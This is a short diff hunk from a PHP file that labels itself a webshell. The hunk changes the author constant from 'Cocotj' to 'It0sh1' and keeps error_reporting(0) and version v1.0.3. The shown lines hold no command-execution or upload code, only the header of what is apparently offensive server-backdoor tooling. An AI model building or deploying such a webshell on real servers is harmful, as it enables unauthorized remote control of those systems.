@@ -6,7 +6,7 @@ session_start();
 error_reporting(0);
 
 // The author of the webshell.
-const Author = "Cocotj";
+const Author = "It0sh1";
 
 // Version of the webshell.
 const Version = "v1.0.3";
